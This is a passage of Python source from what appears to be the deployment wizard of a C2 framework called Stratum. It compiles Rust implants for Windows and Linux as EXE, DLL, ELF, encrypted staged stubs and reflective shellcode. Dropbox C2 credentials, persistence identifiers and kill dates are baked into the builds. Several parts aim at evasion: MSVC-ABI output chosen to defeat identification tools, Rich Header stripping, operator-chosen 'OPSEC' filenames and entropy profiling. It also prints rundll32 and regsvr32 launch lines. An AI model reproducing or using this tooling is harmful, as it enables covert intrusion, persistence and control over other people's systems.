          agent.elf — native Rust ELF, musl-static (zero runtime deps)

        Windows target requires: clang + lld + xwin SDK (~/.xwin).
        Linux target requires: musl-gcc / musl-tools.
        Any missing component is warned and skipped — the step never fails the wizard.
        """
        import shutil as _shutil
        import subprocess as _sp

        self._step("Compile native Rust artifacts")

        _native = Path(__file__).parent.parent / "agents" / "native"

        _cargo_bin = Path.home() / ".cargo" / "bin"
        if not _shutil.which("cargo") and (_cargo_bin / "cargo").exists():
            import os as _os
            _os.environ["PATH"] = str(_cargo_bin) + _os.pathsep + _os.environ.get("PATH", "")

        if not _shutil.which("cargo"):
            warn("cargo not found — skipping compiled artifacts")
            warn("Install: curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh")
            return

        _has_musl  = bool(_shutil.which("musl-gcc") or _shutil.which("x86_64-linux-musl-gcc"))

        # MSVC-compatible cross-compilation via clang-cl + lld-link + xwin Windows SDK.
        # Preferred over MinGW: produces MSVC-ABI PE files (correct .pdata, SEH, no
        # GCC runtime fingerprint) — harder to identify with tools like RIFT or DIE.
        # xwin SDK location: respect XWIN_DIR env, then check home, then SUDO_USER home.
        _xwin_dir = None
        for _candidate in [
            Path(os.environ.get("XWIN_DIR", "")) if os.environ.get("XWIN_DIR") else None,
            Path.home() / ".xwin",
            Path(f"/home/{os.environ.get('SUDO_USER', '')}/.xwin") if os.environ.get("SUDO_USER") else None,
        ]:
            if _candidate and _candidate.is_dir() and (_candidate / "crt").is_dir():
                _xwin_dir = _candidate
                break
        _has_msvc_cl = (
            bool(_shutil.which("clang-cl")) and
            bool(_shutil.which("lld-link")) and
            _xwin_dir is not None
        )
        _xd = str(_xwin_dir) if _xwin_dir else ""
        _msvc_env = {
            "CARGO_TARGET_X86_64_PC_WINDOWS_MSVC_LINKER": "lld-link",
            "CC_x86_64_pc_windows_msvc":  "clang-cl",
            "CXX_x86_64_pc_windows_msvc": "clang-cl",
            "AR_x86_64_pc_windows_msvc":  "llvm-lib",
            "RUSTFLAGS": (
                f"-Lnative={_xd}/crt/lib/x86_64 "
                f"-Lnative={_xd}/sdk/lib/um/x86_64 "
                f"-Lnative={_xd}/sdk/lib/ucrt/x86_64"
            ),
            "CFLAGS_x86_64_pc_windows_msvc": (
                f"-Wno-unused-command-line-argument -fuse-ld=lld-link "
                f"/imsvc{_xd}/crt/include "
                f"/imsvc{_xd}/sdk/include/ucrt "
                f"/imsvc{_xd}/sdk/include/um "
                f"/imsvc{_xd}/sdk/include/shared"
            ),
            "RC": "llvm-rc",
        }

        # Artifact filename stem — matches the deploy mode.
        if cfg.mode == "staged-enc":
            _base = "stub"
        elif cfg.mode == "stageless-enc":
            _base = "agent_stageless"
        else:  # stageless-plain
            _base = "agent"

        def _cargo(wrapper_dir: Path, agent_path: Path,
                   extra_args: list, out_name: str, dest: Path,
                   extra_env: dict | None = None) -> bool:
            if not wrapper_dir.exists():
                warn(f"Wrapper dir missing: {wrapper_dir}")
                return False
            env = {
                **__import__("os").environ,
                "STRATUM_AGENT_PATH": str(agent_path.resolve()),
                "CC_x86_64_unknown_linux_musl": "musl-gcc",
                **(extra_env or {}),
            }
            try:
                r = _cancelable_run(
                    ["cargo", "build", "--release"] + extra_args,
                    cwd=wrapper_dir, env=env,
                    capture_output=True, text=True,
                )
            except _sp.CalledProcessError as _ce:
                warn(f"  cargo cancelled: {_ce.stderr.strip() if isinstance(_ce.stderr, str) else ''}")
                return False
            if r.returncode != 0:
                log_file = agent_dir / "cargo_build.log"
                log_file.write_text(r.stderr, encoding="utf-8")
                warn(f"  cargo failed for {dest.name} — full log: {log_file}\n  {r.stderr.strip()[-200:]}")
                return False
            # Locate the build output and copy to agent_dir
            target_dir = wrapper_dir / "target"
            for candidate in target_dir.rglob(out_name):
                if "/release/" in str(candidate) and not str(candidate).endswith(".d"):
                    import shutil
                    shutil.copy2(candidate, dest)
                    return True
            warn(f"  Build output not found: {out_name}")
            return False

        # ── x64 raw binary shellcode ─────────────────────────────────────────
        # Built after the native agent EXE so the PE is available to embed.
        # Deferred — see after the native agent block below.

        # ── Native Rust agent (agent-rs) ─────────────────────────────────────
        # Fully self-contained: RSA+AES C2, Dropbox transport, persistence compiled in.
        # One artifact per platform — no powershell.exe, no bash, no interpreter.
        if pub_pem:
            _native_dir = _native / "rust"
            if not _native_dir.exists():
                warn("agents/native/rust not found — skipping native agent")
            else:
                _stun_ip = _resolve_stun_ip()

                # Mode-agnostic base: transport creds, timing, blob paths.
                _native_base = {
                    **__import__("os").environ,
                    "STRATUM_WINDOW_START":    cfg.window_start or "",
                    "STRATUM_WINDOW_END":      cfg.window_end   or "",
                    "STRATUM_KILL_DATE":       cfg.kill_date    or "",
                    "STRATUM_BLOB_PATH_LINUX": cfg.blob_path_linux,
                    "STRATUM_BLOB_PATH_WIN":   cfg.blob_path_win,
                    "STRATUM_DEBUG":           "true" if cfg.debug_mode else "false",
                    "CC_x86_64_unknown_linux_musl": "musl-gcc",
                    **self._native_agent_extra_env(cfg),  # APP_KEY/SECRET/REFRESH_TOKEN
                    # Per-deployment persist identity (CRIT-1 Linux, CRIT-2 Windows)
                    "STRATUM_PERSIST_SUFFIX":  cfg.persist_suffix,
                    "STRATUM_PERSIST_PAYLOAD": cfg.persist_payload,
                    "STRATUM_PERSIST_SVC":     cfg.persist_svc,
                    "STRATUM_CRON_COMMENT":    cfg.cron_comment,
                    "STRATUM_RC_COMMENT":      cfg.rc_comment,
                    "STRATUM_TASK_NAME":       cfg.task_name,
                    "STRATUM_REG_VALUE":       cfg.reg_value,
                    "STRATUM_UA":              cfg.ua,
                    "STRATUM_STAGING_PREFIX":  cfg.staging_prefix,
                }

                # Force cargo to use system PATH for musl-gcc and other tools
                import os as _os_mod
                _sys_env = {"PATH": _os_mod.environ.get("PATH", "")}

                if cfg.mode == "staged-enc":
                    # Stub decrypts + execs stage2 using stub_secret baked at compile time.
                    # No RSA key baked in — that lives inside the encrypted stage2.
                    _native_env = {
                        **_native_base,
                        **_sys_env,
                        "STRATUM_DEPLOY_MODE":    "staged-enc",
                        "STRATUM_STUB_SECRET":    cfg.stub_secret,
                        "STRATUM_SALT":           cfg.salt,
                        "STRATUM_S2_PATH_LINUX":  cfg.s2_path_linux,
                        "STRATUM_S2_PATH_WIN":    cfg.s2_path_win,
                    }
                    # Stage2 DLL must be compiled as stageless-plain — all C2 constants
                    # baked in. The stub EXE uses _native_env (staged-enc); the DLL uses this.
                    import base64 as _b64_s2
                    _stage2_dll_env = {
                        **_native_base,
                        **_sys_env,
                        "STRATUM_DEPLOY_MODE":    "stageless-plain",
                        "STRATUM_FOLDER_PATH":    cfg.folder_path,
                        "STRATUM_INPUT_FILE":     cfg.input_file,
                        "STRATUM_OUTPUT_FILE":    cfg.output_file,
                        "STRATUM_HEARTBEAT_FILE": cfg.heartbeat_file,
                        "STRATUM_BASE_SLEEP":     str(cfg.base_sleep),
                        "STRATUM_JITTER":         str(cfg.jitter_percent),
                        "STRATUM_PUBLIC_KEY_B64": _b64_s2.b64encode(pub_pem).decode(),
                        "STRATUM_STUN_IP":        _stun_ip,
                        "STRATUM_SESSION_KEY":    cfg.session_key,
                        "STRATUM_PREKEY_POOL_B64": base64.b64encode(bytes.fromhex(cfg.prekey_pubs_hex)).decode(),
                        "STRATUM_DEBUG":          "true" if cfg.debug_mode else "false",
                    }
                elif cfg.mode == "stageless-enc":
                    # Full agent; C2 config encrypted with stub_secret baked in stub.
                    # Transport creds (APP_KEY etc.) are plain so the agent can auth to cloud.
                    _prekey_pool_b64 = base64.b64encode(bytes.fromhex(cfg.prekey_pubs_hex)).decode()
                    _cfg_fields = "|".join([
                        cfg.folder_path, cfg.input_file, cfg.output_file,
                        cfg.heartbeat_file, str(cfg.base_sleep), str(cfg.jitter_percent),
                        base64.b64encode(pub_pem).decode(), _stun_ip, cfg.session_key,
                        _prekey_pool_b64,
                    ])
                    _enc_cfg = self._encrypt_payload(_cfg_fields, cfg.stub_secret)
                    _native_env = {
                        **_native_base,
                        **_sys_env,
                        "STRATUM_DEPLOY_MODE":      "stageless-enc",
                        "STRATUM_STUB_SECRET":      cfg.stub_secret,
                        "STRATUM_SALT":             cfg.salt,
                        "STRATUM_ENCRYPTED_CONFIG": _enc_cfg,
                        **self._native_agent_extra_env(cfg),  # Ensure transport creds are present
                    }
                else:
                    # stageless-plain — fully self-contained, original behaviour.
                    _native_env = {
                        **_native_base,
                        **_sys_env,
                        "STRATUM_DEPLOY_MODE":    "stageless-plain",
                        "STRATUM_FOLDER_PATH":    cfg.folder_path,
                        "STRATUM_INPUT_FILE":     cfg.input_file,
                        "STRATUM_OUTPUT_FILE":    cfg.output_file,
                        "STRATUM_HEARTBEAT_FILE": cfg.heartbeat_file,
                        "STRATUM_BASE_SLEEP":     str(cfg.base_sleep),
                        "STRATUM_JITTER":         str(cfg.jitter_percent),
                        "STRATUM_PUBLIC_KEY_B64": base64.b64encode(pub_pem).decode(),
                        "STRATUM_STUN_IP":        _stun_ip,
                        "STRATUM_SESSION_KEY":    cfg.session_key,
                        "STRATUM_PREKEY_POOL_B64": base64.b64encode(bytes.fromhex(cfg.prekey_pubs_hex)).decode(),
                    }

                # Force recompile of stratum-agent-rs for every deployment.
                #
                # Root cause: Cargo keeps a compiled build.rs binary in
                #   target/release/build/stratum-agent-rs-<hash>/
                # When build.rs changes between sessions the OLD compiled binary may
                # still be referenced by the per-target fingerprint.  That stale binary
                # emits only cargo:rerun-if-env-changed= lines (no cargo:rustc-env=VALUE),
                # so Cargo sees the same build-script output every run and never
                # recompiles the agent — producing identical binaries across deployments.
                #
                # Fix: delete every stratum-agent-rs build/ and .fingerprint/ subdirectory
                # before building.  Cargo recompiles build.rs from source, gets fresh
                # output with the new STRATUM_* values, and recompiles the crate.
                # Dependency crates (reqwest, rsa, aes …) are untouched.
                import shutil as _fsh
                _target_root = _native_dir / "target"
                # Host-compiled build script (shared across target triples)
                _host_build = _target_root / "release" / "build"
                if _host_build.exists():
                    for _d in _host_build.glob("stratum-agent-rs-*"):
                        _fsh.rmtree(_d, ignore_errors=True)
                # Per-target build script output + crate fingerprint
                for _triple in [
                    "x86_64-pc-windows-msvc",
                    "x86_64-pc-windows-gnu",
                    "x86_64-unknown-linux-musl",
                    "x86_64-unknown-none",
                ]:
                    for _sub in ("release/build", "release/.fingerprint"):
                        _d_root = _target_root / _triple / _sub
                        if _d_root.exists():
                            for _d in _d_root.glob("stratum-agent-rs-*"):
                                _fsh.rmtree(_d, ignore_errors=True)
                            # Also invalidate the compiled crate fingerprint so Cargo
                            # recompiles lib.rs/main.rs even if source timestamps are stale
                            # (can happen with cross-compilation clock skew via cargo-xwin).
                            if _sub == "release/.fingerprint":
                                for _d in _d_root.glob("agent-*"):
                                    _fsh.rmtree(_d, ignore_errors=True)
                # Remove any stale agent artifacts from non-MSVC triples that
                # a previous MinGW build may have left behind.  Without this,
                # rglob-based searches (e.g. in the shellcode launcher) could
                # pick up the wrong binary.  We only produce MSVC-ABI PE files
                # for Windows, so the gnu artifact is always wrong.
                for _stale in (
                    _target_root / "x86_64-pc-windows-gnu" / "release" / "agent.exe",
                    _target_root / "x86_64-pc-windows-gnu" / "release" / "agent.dll",
                ):
                    try:
                        _stale.unlink(missing_ok=True)
                    except OSError:
                        pass

                def _cargo_native(extra_args: list, out_name: str, dest: Path,
                                  win_env: dict | None = None) -> bool:
                    env = {**_native_env, **(win_env or {})}
                    try:
                        r = _cancelable_run(
                            ["cargo", "build", "--release"] + extra_args,
                            cwd=_native_dir, env=env,
                            capture_output=True, text=True,
                        )
                    except _sp.CalledProcessError as _ce:
                        warn(f"  cargo cancelled: {_ce.stderr.strip() if isinstance(_ce.stderr, str) else ''}")
                        return False
                    if r.returncode != 0:
                        log_file = agent_dir / "cargo_build.log"
                        log_file.write_text(r.stderr, encoding="utf-8")
                        warn(f"  cargo failed for {dest.name} — full log: {log_file}\n  {r.stderr.strip()[-200:]}")
                        return False
                    # Derive the exact output path from --target to avoid rglob
                    # accidentally picking up stale artifacts for a different triple
                    # (e.g. a leftover x86_64-pc-windows-gnu/release/agent.exe).
                    try:
                        triple = extra_args[extra_args.index("--target") + 1]
                        candidate = _native_dir / "target" / triple / "release" / out_name
                    except (ValueError, IndexError):
                        candidate = _native_dir / "target" / "release" / out_name
                    if candidate.exists():
                        import shutil as _sh
                        _sh.copy2(candidate, dest)
                        return True
                    warn(f"  Build output not found: {out_name}")
                    return False

                def _strip_rich_header(pe_path: Path) -> None:
                    """LOW-4: zero the Rich Header in the PE DOS stub (bytes 0x80–0xFC).

                    The Rich Header sits between the DOS stub and PE header at a
                    compiler-specific offset, terminated by 'Rich' + checksum (8 bytes).
                    We locate it by scanning backwards from e_lfanew for the 'Rich'
                    marker, then zero from the 'DanS' marker to end-of-Rich.
                    Falls back to zeroing the fixed 0x80–0xFC range if not found.
                    """
                    try:
                        data = bytearray(pe_path.read_bytes())
                        if len(data) < 0x100 or data[:2] != b'MZ':
                            return
                        e_lfanew = int.from_bytes(data[0x3C:0x40], 'little')
                        end = min(e_lfanew, len(data))
                        # Scan backwards for b'Rich'
                        rich_end = -1
                        for i in range(end - 4, 0x3F, -1):
                            if data[i:i+4] == b'Rich':
                                rich_end = i + 8  # include 4-byte checksum
                                break
                        # Scan backwards for b'DanS' (start of Rich Header)
                        rich_start = 0x80  # fallback
                        if rich_end > 0:
                            xor_key = int.from_bytes(data[rich_end-4:rich_end], 'little')
                            for i in range(rich_end - 8, 0x3F, -4):
                                if (int.from_bytes(data[i:i+4], 'little') ^ xor_key) == 0x536E6144:
                                    rich_start = i
                                    break
                            for i in range(rich_start, min(rich_end, len(data))):
                                data[i] = 0
                        # No Rich marker found — lld-link does not emit one; nothing to strip
                        if rich_end > 0:
                            pe_path.write_bytes(bytes(data))
                    except Exception as _e:
                        warn(f"Rich Header strip failed for {pe_path.name}: {_e}")

                # Windows EXE + DLL — MSVC only (clang-cl + lld-link + xwin SDK)
                if _has_msvc_cl:
                    _win_tgt = "x86_64-pc-windows-msvc"
                    _sp.run(["rustup", "target", "add", _win_tgt], capture_output=True)
                    _exe_dest = agent_dir / f"{_base}.exe"
                    if _cargo_native(["--target", _win_tgt, "--bin", "agent"],
                                     "agent.exe", _exe_dest,
                                     win_env=_msvc_env):
                        _strip_rich_header(_exe_dest)  # LOW-4
                        ok(f"{_base}.exe compiled  (native Rust, MSVC-ABI)")
                    _dll_name = f"{_base}.dll"
                    _dll_dest = agent_dir / _dll_name
                    # In staged-enc mode the DLL is the stage2 payload — must be compiled as
                    # stageless-plain so all C2 constants (folder, keys, session key) are
                    # baked in. The stub EXE is compiled with _native_env (staged-enc mode).
                    if cfg.mode == "staged-enc":
                        _dll_win_env = {**_stage2_dll_env, **_msvc_env}
                    else:
                        _dll_win_env = _msvc_env
                    if _cargo_native(["--target", _win_tgt, "--lib"],
                                     "agent.dll", _dll_dest,
                                     win_env=_dll_win_env):
                        _strip_rich_header(_dll_dest)  # LOW-4
                        ok(f"{_dll_name} compiled  (native Rust, MSVC-ABI)")
                        info(f"  Launch → rundll32.exe {_dll_name},Run")
                        info(f"  Launch → regsvr32 /s {_dll_name}")
                else:
                    # Diagnostic: show exactly which check failed
                    _diag = []
                    if not _shutil.which("clang-cl"):
                        _diag.append("clang-cl not in PATH")
                    if not _shutil.which("lld-link"):
                        _diag.append("lld-link not in PATH")
                    if _xwin_dir is None:
                        _diag.append(f"xwin SDK not found (checked: {Path.home()}/.xwin"
                                     f"{', /home/' + os.environ.get('SUDO_USER','') + '/.xwin' if os.environ.get('SUDO_USER') else ''})")
                    warn(f"MSVC toolchain not found — skipping Windows native agent")
                    warn(f"  Reason: {'; '.join(_diag)}")
                    warn("  Fix: apt install clang lld && cargo install xwin")
                    warn("       xwin --accept-license splat --output ~/.xwin")
                    warn("       rustup target add x86_64-pc-windows-msvc")

                # Linux ELF — musl-static, fully self-contained, zero runtime deps
                _lin_tgt = "x86_64-unknown-linux-musl"
                _sp.run(["rustup", "target", "add", _lin_tgt], capture_output=True)
                if _cargo_native(["--target", _lin_tgt, "--bin", "agent"],
                                 "agent", agent_dir / f"{_base}.elf"):
                    ok(f"{_base}.elf compiled  (native Rust, musl-static)")
                elif not _has_musl:
                    warn("musl-tools not found — if build failed: apt install musl-tools")

                # Staged-enc: compile a stage2 ELF (full agent, stageless-plain mode)
                # that the stub downloads, decrypts, and exec's via memfd.
                if cfg.mode == "staged-enc" and _has_musl:
                    # Purge fingerprints before recompiling with different env vars
                    for _sub in ("release/build", "release/.fingerprint"):
                        _d_root = _target_root / _lin_tgt / _sub
                        if _d_root.exists():
                            for _d in _d_root.glob("stratum-agent-rs-*"):
                                _fsh.rmtree(_d, ignore_errors=True)
                            for _d in _d_root.glob("agent-*"):
                                _fsh.rmtree(_d, ignore_errors=True)
                    _saved_native = _native_env
                    _native_env = _stage2_dll_env
                    if _cargo_native(["--target", _lin_tgt, "--bin", "agent"],
                                     "agent", agent_dir / "stage2.elf"):
                        ok("stage2.elf compiled  (stage2 Linux — full Rust agent)")
                    else:
                        warn("Stage2 ELF build failed — staged-enc Linux will not work")
                    _native_env = _saved_native

                # ── x64 reflective shellcode — embeds the MSVC DLL ───────────
                # DLL is used instead of EXE: an EXE entry point expects full CRT
                # init (GetStartupInfoW etc.) and crashes when called as DllMain.
                # DllMain(DLL_PROCESS_ATTACH) is the correct reflective-load entry.
                _dll_path = agent_dir / f"{_base}.dll"
                _exe_path = agent_dir / f"{_base}.exe"  # kept for reference only
                if _dll_path.exists():
                    _sc_tgt = "x86_64-unknown-none"
                    _sp.run(["rustup", "target", "add", _sc_tgt], capture_output=True)

                    # _cargo() passes STRATUM_AGENT_PATH; we need STRATUM_PE_PATH.
                    # Build a minimal wrapper that sets the right env var and invokes cargo.
                    import os as _os_sc
                    import shutil as _sh_sc
                    _sc_dir = _native / "shellcode"
                    if _sc_dir.exists():
                        _pe_path_str = str(_dll_path.resolve())
                        info(f"  shellcode: STRATUM_PE_PATH={_pe_path_str}  exists={_dll_path.exists()}  size={_dll_path.stat().st_size if _dll_path.exists() else 'N/A'}")
                        _sc_env = {
                            **_os_sc.environ,
                            "STRATUM_PE_PATH": _pe_path_str,
                        }
                        # Force recompile — the embedded PE changes every deployment.
                        # Delete build/, .fingerprint/, deps/shellcode*, and the
                        # final binary so Cargo cannot serve any cached artifact.
                        _sc_rel = _sc_dir / "target" / _sc_tgt / "release"
                        for _sub, _glob in [
                            ("build",        "stratum-shellcode-*"),
                            (".fingerprint", "stratum-shellcode-*"),
                            ("deps",         "shellcode*"),
                        ]:
                            _d = _sc_rel / _sub
                            if _d.exists():
                                for _item in _d.glob(_glob):
                                    _sh_sc.rmtree(_item, ignore_errors=True)
                        _sc_bin = _sc_rel / "shellcode"
                        if _sc_bin.exists():
                            _sc_bin.unlink(missing_ok=True)

                        _r = _sp.run(
                            ["cargo", "build", "--release", "--target", _sc_tgt],
                            cwd=_sc_dir, env=_sc_env,
                            capture_output=True, text=True,
                        )
                        if _r.returncode == 0:
                            _sc_out = _sc_dir / "target" / _sc_tgt / "release" / "shellcode"
                            _sc_dest = agent_dir / f"{_base}.bin"
                            if _sc_out.exists():
                                _sh_sc.copy2(_sc_out, _sc_dest)
                                info(f"  shellcode blob size: {_sc_dest.stat().st_size} bytes")
                                ok(f"{_base}.bin compiled  (x64 reflective shellcode, embeds {_base}.dll)")
                        else:
                            warn(f"  shellcode build failed: {_r.stderr.strip()[-200:]}")
                else:
                    warn(f"{_base}.bin skipped — MSVC DLL required (stub.dll must exist before shellcode build)")

    def _step_rename_agents(self, cfg: BaseConfig, agent_dir: Path) -> None:
        """Rename compiled agent artifacts to operator-supplied OPSEC names."""
        import re as _re
        def _safe_stem(s: str) -> str:
            # Strip path separators and dots to prevent path traversal / hidden files.
            # Allow alphanumerics, dash, underscore only.
            return _re.sub(r'[^A-Za-z0-9_\-]', '', s)[:64]

        win_stem   = _safe_stem(cfg.agent_name_win)   if cfg.agent_name_win   else ""
        linux_stem = _safe_stem(cfg.agent_name_linux) if cfg.agent_name_linux else ""
        if not win_stem and not linux_stem:
            return

        _EXT_WIN   = (".exe", ".dll", ".bin")
        _EXT_LINUX = (".elf",)
        renamed = []
        for f in sorted(agent_dir.iterdir()):
            if not f.is_file():
                continue
            ext      = f.suffix
            new_stem = None
            if ext in _EXT_WIN and win_stem:
                new_stem = win_stem
            elif ext in _EXT_LINUX and linux_stem:
                new_stem = linux_stem
            if new_stem:
                new_name = new_stem + ext
                dst = agent_dir / new_name
                if dst != f:
                    f.rename(dst)
                    renamed.append(f"{f.name} → {new_name}")
        if renamed:
            self._step("Agent Renaming")
            for r in renamed:
                ok(r)

    # Script entropy padding removed — Rust binaries are compiled natively
    # and don't embed script payloads that would inflate section entropy.

    def _step_entropy_table(self, agent_dir: Path) -> None:
        """Display a per-artifact Shannon entropy table after compilation."""
        artifacts = sorted(
            p for p in agent_dir.iterdir()
            if p.is_file() and p.suffix not in (".txt",)
        )
        if not artifacts:
            return

        NAME_W, SIZE_W, ENT_W, PROF_W = 38, 10, 13, 18
        top = "  ┌" + "─"*NAME_W + "┬" + "─"*SIZE_W + "┬" + "─"*ENT_W + "┬" + "─"*PROF_W + "┐"
        mid = "  ├" + "─"*NAME_W + "┼" + "─"*SIZE_W + "┼" + "─"*ENT_W + "┼" + "─"*PROF_W + "┤"
        bot = "  └" + "─"*NAME_W + "┴" + "─"*SIZE_W + "┴" + "─"*ENT_W + "┴" + "─"*PROF_W + "┘"

        _p([("", "")])
        _p([("class:cyan", top)])
        hdr = (f"  │ {'Artifact':<{NAME_W-1}}│{'Size':^{SIZE_W}}"
               f"│{'Entropy':^{ENT_W}}│{'Profile':^{PROF_W}}│")
        _p([("class:cyan", hdr)])
        _p([("class:cyan", mid)])

        for p in artifacts:
            try:
                data = p.read_bytes()
            except Exception:
                continue
            sz = len(data)
            H  = _entropy(data)

            if sz >= 1024 * 1024:
                sz_str = f"{sz / 1048576:.1f} MB"
            elif sz >= 1024:
                sz_str = f"{sz // 1024} KB"
            else:
                sz_str = f"{sz} B"

            n_blk = round(H / 8 * 10)
            bar   = "█" * n_blk + "░" * (10 - n_blk)

            if H < 5.5:
                status, vc = "ok",   "class:green"
            elif H < 7.0:
                status, vc = "ok",   "class:yellow"
            else:
                status, vc = "high", "class:red"

            name_col = f" {p.name:<{NAME_W-1}}"
            size_col = f"{sz_str:^{SIZE_W}}"
            ent_col  = f"  {H:.2f} b/B   "       # fixed 13 chars
            prof_col = f" {bar} {status:<6}"      # fixed 18 chars

            _p([
                ("class:cyan",  "  │"),
                ("class:white", name_col),
                ("class:cyan",  "│"),
                ("class:dim",   size_col),
                ("class:cyan",  "│"),
                (vc,            ent_col),
                ("class:cyan",  "│"),
                (vc,            prof_col),
                ("class:cyan",  "│"),
            ])

        _p([("class:cyan", bot)])
        _p([("", "")])

    # ── template method ────────────────────────────────────────────────────────

    def run(self, manager: SessionManager,
            project_dir: Path = Path(".")) -> Session:
        """Run the full deployment wizard and register the new session."""
        from providers import WizardError as _WizardError
        import shutil as _shutil

        project_dir = project_dir.resolve()
        cfg = self.make_config()
        self._step_n = 0
        deploy_dir: Optional[Path] = None

        try:
            self._step_check_templates()
            self.step_auth(cfg)
            self._step_configure(cfg)

            # Warn if folder_path collides with an existing session (same provider + path).
            _existing_folders = {
                s.profile.folder_path
                for s in manager.all()
                if s.profile.provider == self.PROVIDER_ID and hasattr(s.profile, "folder_path")
            }
            if cfg.folder_path in _existing_folders:
                warn(f"Folder path '{cfg.folder_path}' is already used by another {self.PROVIDER_NAME} session.")
                warn("Two agents sharing the same folder will collide on the dead-drop channel.")
                if not ask_yn("Continue anyway?", default=False):
                    raise _WizardError("Aborted — choose a unique folder path.")

            _check_cancelled()
            if cfg.mode in ("staged-enc", "stageless-enc"):
                self._step_generate_stub_secret(cfg)

            _deploy_base = Path("deployments")
            session_id = os.urandom(6).hex()
            try:
                while any(_deploy_base.glob(f"{self.PROVIDER_ID}_*_{session_id}")):
                    session_id = os.urandom(6).hex()
            except OSError:
                pass  # deployments/ doesn't exist yet — no collision possible

            deploy_dir = self._step_create_deploy_dir(cfg, session_id)
            agent_dir  = deploy_dir / "agent"
            keys_dir   = deploy_dir / "keys" / session_id

            # Copy shared credentials cache into deploy dir for per-session isolation.
            _dest_creds = self._creds_path(deploy_dir)
            _src_creds  = self._global_creds_file
            if _src_creds.exists() and _dest_creds != _src_creds:
                try:
                    _shutil.copy2(_src_creds, _dest_creds)
                    _dest_creds.chmod(0o600)
                except Exception as _cp_exc:
                    warn(f"Could not copy credentials to deploy dir: {_cp_exc}")

            _check_cancelled()
            _priv_pem, pub_pem = self._step_keygen(keys_dir, session_id, cfg,
                                                    manager._key_password)

            # Derive per-deploy cloud filenames from the pub key hash to avoid
            # static .s2l/.s2w fingerprints common to all Stratum deployments.
            _h = hashlib.sha256(pub_pem).hexdigest()
            cfg.sk_suffix  = "." + _h[34:40]
            cfg.s2l_suffix = "." + _h[22:28]
            cfg.s2w_suffix = "." + _h[28:34]

            _check_cancelled()
            self.step_init_channel(cfg)

            _check_cancelled()
            self._step_compile_artifacts(cfg, agent_dir, pub_pem)
            _check_cancelled()
            if cfg.mode == "staged-enc":
                self.step_upload_stage2(cfg, agent_dir)
            self._step_rename_agents(cfg, agent_dir)
            self._step_entropy_table(agent_dir)

            # Build session profile — creds_file is relative to project root (e.g. credentials/dropbox)
            # or relative to project_dir. Path division handles both cases correctly.
            creds_rel_path = str(self._creds_path(deploy_dir))
            key_rel_path   = str(deploy_dir / "keys" / session_id / "private_key.pem")
            profile = SessionProfile(
                session_id       = session_id,
                label            = cfg.session_label or cfg.folder_path.strip("/"),
                provider         = self.PROVIDER_ID,
                creds_file       = creds_rel_path,
                private_key_file = key_rel_path,
                folder_path      = cfg.folder_path,
                input_file       = cfg.input_file,
                output_file      = cfg.output_file,
                heartbeat_file   = cfg.heartbeat_file,
                base_sleep       = cfg.base_sleep,
                jitter_percent   = cfg.jitter_percent,
                deploy_mode      = cfg.mode,
                blob_path        = cfg.blob_path_linux,
                blob_path_win    = cfg.blob_path_win,
                ip_ext           = cfg.ip_ext,
                s2_path_cloud    = cfg.s2_path_linux if cfg.mode == "staged-enc" else "",
                s2_uploaded_at   = cfg.s2_uploaded_at,
                session_key      = cfg.session_key,
                prekey_privs_hex = cfg.prekey_privs_hex,
                prekey_pubs_hex  = cfg.prekey_pubs_hex,
                fs_enabled       = cfg.fs_enabled,
                added_at         = _tz.now().isoformat(),
                kill_date        = cfg.kill_date    or "",
                window_start     = cfg.window_start or "",
                window_end       = cfg.window_end   or "",
                stratum_version  = _stratum_version,
            )

            # Instantiate transport from freshly-obtained credentials
            transport = self._make_transport(cfg)

            # Clear any stale task left on the input channel from a previous
            # deployment that shared the same cloud folder path.
            transport.upload(profile.input_path, MZ_MARKER.encode())

            # Create session, start HB monitor, register in manager.
            # From this point on, rollback is no longer safe (HB thread started).
            session = Session(profile, transport, project_dir, manager._key_password)
            _load_persist_probe(session)
            session.private_key_file   # validate key exists
            raw = transport.download(profile.output_path)
            session.baseline = raw.decode("utf-8", errors="replace").strip() if raw else MZ_MARKER
            _initial_hb_check(session)
            session._hb = HeartbeatMonitor(session)
            session._hb.start()
            manager.add(session)

        except Exception as _deploy_exc:
            import traceback as _tb
            warn(f"Deploy exception: {_deploy_exc}")
            warn(_tb.format_exc())
            if deploy_dir is not None and deploy_dir.exists():
                try:
                    _shutil.rmtree(deploy_dir)
                    warn(f"Deploy aborted — local artifacts removed: {deploy_dir}")
                except Exception as _rm_exc:
                    warn(f"Deploy aborted — could not remove {deploy_dir}: {_rm_exc}")
            if self._cloud_cleanup_paths and self._cloud_transport is not None:
                warn(f"Rolling back {len(self._cloud_cleanup_paths)} cloud artifact(s)...")
                for _cp in self._cloud_cleanup_paths:
                    try:
                        self._cloud_transport.delete(_cp)
                        warn(f"  Deleted: {_cp}")
                    except Exception as _del_exc:
                        warn(f"  Could not delete {_cp}: {_del_exc}")
            elif self._cloud_cleanup_paths:
                warn(f"NOTE: {len(self._cloud_cleanup_paths)} cloud artifact(s) may remain (no transport available for cleanup).")
            raise

        self._step_generate_docs(cfg, deploy_dir, session_id)
        self._step_summary(cfg, deploy_dir, session_id)

        return session
